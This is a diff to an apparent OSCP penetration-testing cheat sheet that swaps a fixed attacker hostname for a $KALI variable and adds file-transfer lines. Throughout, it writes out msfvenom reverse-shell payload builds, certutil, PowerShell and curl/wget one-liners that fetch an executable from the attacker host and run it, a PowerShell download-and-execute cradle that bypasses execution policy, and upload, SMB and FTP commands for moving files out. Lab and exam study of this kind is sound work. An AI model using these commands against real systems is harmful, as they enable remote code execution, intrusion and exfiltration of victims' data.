@@ -161,9 +161,9 @@ To run in a PHP file: change `php -r '$COMMAND_BLOCK'` to `<?php $COMMAND_BLOCK 
 
 |   |   |
 |---|---|
-|Linux (Python)|`msfvenom -p linux/x64/shell_reverse_tcp LHOST=kali.vx LPORT=4444 -f py -o /var/www/html/reverse.py`|
-|Linux (ELF)|`msfvenom -p linux/x64/shell_reverse_tcp LHOST=kali.vx LPORT=4444 -f elf -o /var/www/html/reverse.elf`|
-|Windows|`msfvenom -p windows/x64/shell_reverse_tcp LHOST=kali.vx LPORT=4444 -f exe -o /var/www/html/reverse.exe`
+|Linux (Python)|`msfvenom -p linux/x64/shell_reverse_tcp LHOST=$KALI LPORT=4444 -f py -o /var/www/html/reverse.py`|
+|Linux (ELF)|`msfvenom -p linux/x64/shell_reverse_tcp LHOST=$KALI LPORT=4444 -f elf -o /var/www/html/reverse.elf`|
+|Windows|`msfvenom -p windows/x64/shell_reverse_tcp LHOST=$KALI LPORT=4444 -f exe -o /var/www/html/reverse.exe`
 
 #### PowerShell-based reverse shell script:
 
@@ -176,7 +176,7 @@ curl -O https://raw.githubusercontent.com/joetanx/oscp/main/reverse.ps1
 Edit the address and port:
 
 ```console
-sed -i 's/<ADDRESS>/kali.vx/' reverse.ps1
+sed -i 's/<ADDRESS>/$KALI/' reverse.ps1
 sed -i 's/<PORT>/4444/' reverse.ps1
 ```
 
@@ -186,8 +186,8 @@ sed -i 's/<PORT>/4444/' reverse.ps1
 
 |   |   |
 |---|---|
-|certutil|`certutil.exe /urlcache /f /split http://kali.vx/reverse.exe %TEMP%\reverse.exe && %TEMP%\reverse.exe`|
-|PowerShell|`powershell.exe -NoProfile -ExecutionPolicy Bypass -Command (New-Object System.Net.WebClient).DownloadFile('http://kali.vx/reverse.exe','%TEMP%\reverse.exe'); Start-Process %TEMP%\reverse.exe`|
+|certutil|`certutil.exe /urlcache /f /split http://$KALI/reverse.exe %TEMP%\reverse.exe && %TEMP%\reverse.exe`|
+|PowerShell|`powershell.exe -NoProfile -ExecutionPolicy Bypass -Command (New-Object System.Net.WebClient).DownloadFile('http://$KALI/reverse.exe','%TEMP%\reverse.exe'); Start-Process %TEMP%\reverse.exe`|
 
 #### Windows: Execute PowerShell-based reverse shell script
 
@@ -196,15 +196,15 @@ sed -i 's/<PORT>/4444/' reverse.ps1
 (i.e. `DownloadFile` of the reverse shell executable and try to run it with `Invoke-Expression` will not work)
 
 ```cmd
-powershell.exe -NoProfile -ExecutionPolicy Bypass -Command Invoke-Expression (New-Object System.Net.WebClient).DownloadString('http://kali.vx/reverse.ps1')
+powershell.exe -NoProfile -ExecutionPolicy Bypass -Command Invoke-Expression (New-Object System.Net.WebClient).DownloadString('http://$KALI/reverse.ps1')
 ```
 
 #### Linux: Execute reverse shell TCP payload
 
 |   |   |
 |---|---|
-|cURL|`curl -O http://kali.vx/reverse.elf && chmod +x reverse.elf && ./reverse.elf`|
-|Wget|`wget http://kali.vx/reverse.elf && chmod +x reverse.elf && ./reverse.elf`|
+|cURL|`curl -O http://$KALI/reverse.elf && chmod +x reverse.elf && ./reverse.elf`|
+|Wget|`wget http://$KALI/reverse.elf && chmod +x reverse.elf && ./reverse.elf`|
 
 ### 3.5. Windows direct connection
 
@@ -248,15 +248,15 @@ Windows:
 
 |   |   |
 |---|---|
-|certutil|`certutil.exe /urlcache /f /split http://kali.vx/reverse.exe %TEMP%\reverse.exe`|
-|PowerShell|`powershell.exe -NoProfile -ExecutionPolicy Bypass -Command (New-Object System.Net.WebClient).DownloadFile('http://kali.vx/reverse.exe','%TEMP%\reverse.exe')`|
+|certutil|`certutil.exe /urlcache /f /split http://$KALI/reverse.exe %TEMP%\reverse.exe`|
+|PowerShell|`powershell.exe -NoProfile -ExecutionPolicy Bypass -Command (New-Object System.Net.WebClient).DownloadFile('http://$KALI/reverse.exe','%TEMP%\reverse.exe')`|
 
 Linux:
 
 |   |   |
 |---|---|
-|cURL|`curl -O http://kali.vx/reverse.elf && chmod +x reverse.elf`|
-|Wget|`wget http://kali.vx/reverse.elf && chmod +x reverse.elf`|
+|cURL|`curl -O http://$KALI/reverse.elf`|
+|Wget|`wget http://$KALI/reverse.elf`|
 
 
 #### Upload
@@ -283,12 +283,10 @@ curl -o /var/www/html/upload.php https://raw.githubusercontent.com/joetanx/oscp/
 
 </details>
 
-Uploading:
-
 |   |   |
 |---|---|
-|PowerShell|`powershell.exe -NoProfile -ExecutionPolicy Bypass -Command (New-Object System.Net.WebClient).UploadFile('http://kali.vx/upload.php','The Little Prince.jpg')`|
-|cURL|`curl -H 'Content-Type:multipart/form-data' -X POST -F file=@"The Little Prince.jpg" -v http://kali.vx/upload.php`|
+|PowerShell|`powershell.exe -NoProfile -ExecutionPolicy Bypass -Command (New-Object System.Net.WebClient).UploadFile('http://$KALI/upload.php','$FILENAME')`|
+|cURL|`curl -H 'Content-Type:multipart/form-data' -X POST -F file=@"$FILENAME" -v http://$KALI/upload.php`|
 
 ### 4.2. SMB
 
@@ -316,6 +314,11 @@ EOF
 
 </details>
 
+|   |   |
+|---|---|
+|Download|`copy \\$KALI\public\$FILENAME .\`|
+|Upload|`copy "$FILENAME" \\$KALI\public\`|
+
 ### 4.3. FTP
 
 <details>
@@ -329,8 +332,6 @@ sed -i 's/#anon_upload_enable=YES/anon_upload_enable=YES/' /etc/vsftpd.conf
 ```
 
 </details>
-
-Download:
 
 ```cmd
 ftp -A $KALI
